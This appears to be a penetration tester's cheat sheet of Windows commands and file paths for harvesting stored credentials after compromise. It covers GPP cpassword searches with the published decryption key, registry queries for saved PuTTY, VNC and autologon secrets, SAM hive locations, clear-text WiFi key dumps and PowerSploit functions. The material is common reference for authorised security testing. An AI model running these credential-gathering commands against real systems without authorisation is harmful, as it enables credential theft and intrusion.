# Simple Credential Searches
## Mass Install of Windows to Labs
Sometimes the mass-install process of many Microsoft Windows machines in the same environment can leave behind log files with sensitive information in them. We can check a few of these files if they exist on the file system onthe compromised target Windows machine,
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
## Groups.xml (GPP)
If we have access to the SYSVOL/groups.xml file, we have access to any passwords encrypted in there. When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted. 

Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.
```
C:> findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```
The AES decryption key, published by Microsoft themselves, is,
```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8	
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```
There is a PowerSploit Power Shell script that we can use to automate the password reveal [located here.](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
## More Possible Credential Files
#### XML INI CONFIG Credentials
```
C:> dir /s *pass* == *cred* == *vnc* == *.config*
C:> findstr /si password *.xml *.ini *.txt
```
## Registry Searches for Credentials
#### PuTTY
```
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
```
#### RealVNC
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```
#### Windows AutoLogin
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
#### SNMP
```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```
#### Last-Ditch-Effort Registry Search
```
C:> reg query HKLM /f password /t REG_SZ /s
C:> reg query HKCU /f password /t REG_SZ /s
```
## SAM 
We can check the following files for credentials
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
## Unattended
Unattend XML Files may contain passwords also,
```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
## IIS Admin Credentials
The following locations should be checked for plain-text adminstrator credentials for the IIS server.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```
## WiFi Passwords
We might be able to reuse a WiFi password on a compromised system if we have view access to it.
```
C:> netsh wlan show profile
C:> netsh wlan show profile (SSID) key=clear
```
## Using PowerSploit
```
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```
## Config/XML/INF Files
```
C:\> dir /b /s web.config
C:\> dir /b /s unattend.xml
C:\> dir /b /s sysprep.inf
C:\> dir /b /s sysprep.xml
C:\> dir /b /s *pass*
```
